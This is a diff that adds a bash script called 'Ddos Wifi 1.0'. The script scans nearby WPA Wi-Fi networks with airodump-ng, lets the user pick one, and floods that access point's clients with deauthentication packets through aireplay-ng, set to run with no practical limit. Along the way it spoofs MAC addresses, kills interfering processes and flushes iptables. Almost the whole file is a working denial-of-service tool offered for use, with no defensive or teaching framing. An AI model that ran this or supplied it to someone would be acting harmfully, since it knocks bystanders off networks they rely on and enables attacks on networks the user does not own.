@@ -1,0 +1,452 @@
+#!/bin/bash
+
+#DEBUG Mode
+if [ -z ${Ddos_DEBUG+x} ]; then Ddos_DEBUG=0
+else Ddos_DEBUG=1
+fi
+
+# Configuration
+#Dump path
+DUMP_PATH="/tmp/TMPDdos"
+
+# Deauth time
+DEAUTHTIME="9999999999999"
+
+#colors
+white="\033[1;37m"
+grey="\033[0;37m"
+purple="\033[0;35m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+blue="\033[1;34m"
+transparent="\e[0m"
+
+# DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
+if [ $Ddos_DEBUG = 1 ]; then
+	## Developer Mode
+	export Ddos_output_device=/dev/stdout
+	HOLD="-hold"
+else
+	## Normal Mode
+	export Ddos_output_device=/dev/null
+	HOLD=""
+fi
+
+# Delete Log only in Normal Mode !
+function conditional_clear() {
+
+	if [[ "$Ddos_output_device" != "/dev/stdout" ]]; then clear; fi
+}
+
+function airmon {
+	chmod +x airmon
+}
+airmon
+
+#Function to executed in case of unexpected termination
+trap exitmode SIGINT SIGHUP
+
+# KILL ALL
+function exitmode {
+	conditional_clear
+	top
+	echo -e "\n\n"$white"["$red"-"$white"] "$red"Backing up"$transparent""
+	if ps -A | grep -q aireplay-ng; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
+		killall aireplay-ng &>$Ddos_output_device
+	fi
+
+	if ps -A | grep -q airodump-ng; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
+		killall airodump-ng &>$Ddos_output_device
+	fi	
+	
+	if [ "$WIFI_MONITOR" != "" ]; then
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Disabling monitor interface "$green"$WIFI_MONITOR"$transparent""
+		./airmon stop $WIFI_MONITOR &> $Ddos_output_device
+	fi
+	
+	if [ "$WIFI" != "" ]; then
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"Disabling interface "$green"$WIFI"$transparent""
+		./airmon stop $WIFI &> $Ddos_output_device
+		./airmon stop $WIFI_MONITOR &> $Ddos_output_device
+		macchanger -p $WIFI &> $Ddos_output_device
+	fi
+	
+	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
+		echo -e ""$white"["$red"-"$white"] "$white"Disabling "$grey"forwarding of packets"$transparent""
+		sysctl -w net.ipv4.ip_forward=0 &>$Ddos_output_device
+	fi
+	
+	echo -e ""$white"["$red"-"$white"] "$white"Cleaning "$grey"iptables""$transparent"
+	iptables --flush
+	iptables --table nat --flush
+	iptables --delete-chain
+	iptables --table nat --delete-chain
+	
+	echo -e ""$white"["$red"-"$white"] "$white"Restoring "$grey"tput""$transparent"
+	tput cnorm
+
+	if [ $Ddos_DEBUG != 1 ]; then
+
+		echo -e ""$white"["$red"-"$white"] "$white"Delete "$grey"files"$transparent""
+		rm -R $DUMP_PATH/* &>$Ddos_output_device
+	fi
+
+	echo -e ""$white"["$red"-"$white"] "$white"Restarting "$grey"Network-Manager"$transparent""
+	service network-manager restart &> $Ddos_output_device &
+	service networking restart &> $Ddos_output_device &
+	service restart networkmanager &> $Ddos_output_device &
+	echo -e ""$white"["$green"+"$white"] "$red"Cleanup performed successfully!"$transparent""
+	echo -e ""$white"["$green"+"$white"] "$green"VKing34 thanks you for using this program <3 :*"$transparent""
+	sleep 5
+	clear
+	exit
+}
+	
+	
+	
+
+
+#Design
+function top(){
+	echo -e "$green#########################################################"
+	echo -e "$green#                                                       #"
+  echo -e "$green#    $red    Ddos Wifi 1.0" "${yellow} ${red}< ""${red}What" "${yellow}the" "${red}Fuck" "${yellow}Is" "${red}Love >    "        ${green}"  #"
+	echo -e "$green#                     "${yellow} by "${red}V""${yellow}king""${red}"34" 	               "    ${green}#""
+	echo -e "$green#                                                       #"
+	echo -e "$green#########################################################""$transparent"
+	echo
+	echo
+
+}
+
+#Start program
+
+#Check requirements
+function checkrequirements {
+	
+	conditional_clear
+	echo "Check requirements:"
+	sleep 0.025
+	echo -ne " + Airmon.........."
+	if ! hash ./airmon 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne " + Airodump-ng....."
+	if ! hash airodump-ng 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+	
+	echo -ne " + Iwconfig........"
+	if ! hash iwconfig 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+	
+	echo -ne " + Macchanger......"
+	if ! hash macchanger 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+	    echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+	
+	echo -ne " + Aireplay-ng....."
+	if ! hash aireplay-ng 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne " + Awk............."
+	if ! hash awk 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+
+	if [ "$exit" = "1" ]; then
+	exit 1
+	fi
+
+	sleep 3.2
+	clear
+}
+#Step 1:
+top
+checkrequirements
+
+#Step 2:
+# Create working directory
+if [ ! -d $DUMP_PATH ]; then
+	mkdir -p $DUMP_PATH &>$Ddos_output_device
+fi
+
+if [ $Ddos_DEBUG != 1 ]; then
+	top
+	sleep 2
+fi
+
+# Choose Interface
+function setinterface {
+
+	conditional_clear
+	top
+	#unblock interfaces
+	rfkill unblock all
+
+	# Collect all interfaces in montitor mode
+	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
+
+
+	# Create a variable with the list of physical network interfaces
+	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
+	INTERFACESNUMBER=`./airmon| grep -c "-"`
+
+
+	if [ "$INTERFACESNUMBER" -gt "0" ]; then
+
+		echo "Select an interface"
+		echo
+		i=0
+
+		for line in "${wirelessifaces[@]}"; do
+			i=$(($i+1))
+			wirelessifaces[$i]=$line
+			echo -e "$blue ""$i)"$transparent" $line"
+		done
+		echo
+		echo -n "#? "
+		read line
+		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
+
+		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
+			conditional_clear
+			top
+			setinterface
+		fi
+
+		readarray -t naggysoftware < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
+		WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')
+
+		if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
+		rmmod -f "$WIFIDRIVER" &>$Ddos_output_device 2>&1
+		fi
+
+		for nagger in "${naggysoftware[@]}"; do
+			killall "$nagger" &>$Ddos_output_device
+		done
+		sleep 0.5
+
+		if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
+		modprobe "$WIFIDRIVER" &>$Ddos_output_device 2>&1
+		sleep 0.5
+		fi
+	
+		# Select Wifi Interface
+		select PREWIFI in $INTERFACES; do
+			break;
+		done
+		ifconfig $PREWIFI down
+		WIFIMONITOR=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
+		WIFI_MONITOR=$WIFIMONITOR
+		WIFI=$PREWIFI
+
+		#No wireless cards
+	else
+
+		echo "There are no wireless cards, quit..."
+		sleep 5
+		exitmode
+	fi
+
+	deltax
+}
+
+#Step 3:
+# Check files
+function deltax {
+
+	conditional_clear
+	CSVDB=dump-01.csv
+
+	rm -rf $DUMP_PATH/*
+
+	ScanAll
+	selection
+}
+
+#Step 4:
+# Scans the entire networks
+function ScanAll {
+
+	conditional_clear
+	TOPLEFTBIG="-geometry 91x42+0+0"
+	header_scan="WIFI Monitor"
+	rm -rf $DUMP_PATH/dump*
+	xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
+}
+
+#Step 5:
+# Choose a network
+function selection {
+	
+	conditional_clear
+	top
+	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
+	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
+		deltax && break
+	fi
+	Ddosap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+	Ddosap=`expr $Ddosap - 1`
+	head -n $Ddosap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
+	tail -n +$Ddosap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
+	
+	echo "                        WIFI LIST "
+	echo ""
+	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
+	echo ""
+	i=0
+
+	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
+		longueur=${#MAC}
+		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
+		PRIVACY=${PRIVACY:0:4}
+		if [ $longueur -ge 17 ]; then
+			i=$(($i+1))
+			POWER=`expr $POWER + 100`
+			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
+
+			if [ "$CLIENTE" != "" ]; then
+				CLIENTE="*"
+			echo -e " ""$red "$i")"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""
+
+			else
+
+			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
+
+			fi
+
+			aidlenght=$IDLENGTH
+			assid[$i]=$ESSID
+			achannel[$i]=$CHANNEL
+			amac[$i]=$MAC
+			aprivacy[$i]=$PRIVACY
+			aspeed[$i]=$SPEED
+		fi
+	done < $DUMP_PATH/dump-02.csv
+	echo
+	echo -e ""$green "("$white"*"$green")$selection_1"$transparent""
+	echo ""
+	echo -e "        "Select target. For rescan type$red r$transparent""
+	echo -n "      #> "
+	read choice
+
+	if [[ $choice -eq "r" ]]; then
+	deltax
+	fi
+
+	idlenght=${aidlenght[$choice]}
+	ssid=${assid[$choice]}
+	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
+	mac=${amac[$choice]}
+	privacy=${aprivacy[$choice]}
+	speed=${aspeed[$choice]}
+	Host_IDL=$idlength
+	Host_SPEED=$speed
+	Host_ENC=$privacy
+	Host_MAC=$mac
+	Host_CHAN=$channel
+	acouper=${#ssid}
+	fin=$(($acouper-idlength))
+	Host_SSID=${ssid:1:fin}
+	
+	deauth
+	
+}
+
+function deauth
+{
+	conditional_clear
+
+	iwconfig $WIFI_MONITOR channel $Host_CHAN
+	DEAUTH=deauthall
+	capture & $DEAUTH
+	CSVDB=$Host_MAC-01.csv	
+	
+	menu
+}
+
+function menu
+{
+		while true; do
+		conditional_clear
+
+		clear
+		top
+		echo
+		echo
+		echo -e "      "$blue"1)"$transparent" Choose other target"
+		echo -e "      "$blue"2)"$transparent" Rescan"
+		echo -e "      "$blue"3)"$transparent" Exit"
+		echo -n '      #> '
+		read vk
+		echo ""
+		case $vk in
+			1 ) killall airodump-ng mdk3 aireplay-ng xterm &>$Ddos_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
+			2 ) deltax; break;;
+			3 ) exitmode; break;;
+			* ) echo "$red Are you kidding me or You are f**king blind ?" conditional_clear;;
+		esac
+	done
+}
+# Capture all
+function capture {
+	TOPRIGHT="-geometry 90x27-0+0"
+	conditional_clear
+	if ! ps -A | grep -q airodump-ng; then
+
+		rm -rf $DUMP_PATH/$Host_MAC*
+		xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
+	fi
+}
+
+# Deauth all
+function deauthall {
+	BOTTOMRIGHT="-geometry 75x12-0-0"
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
+}
+
+
+trap exitmode SIGINT
+trap exitmode SIGTERM
+
+clear; setinterface
+
+
+
+
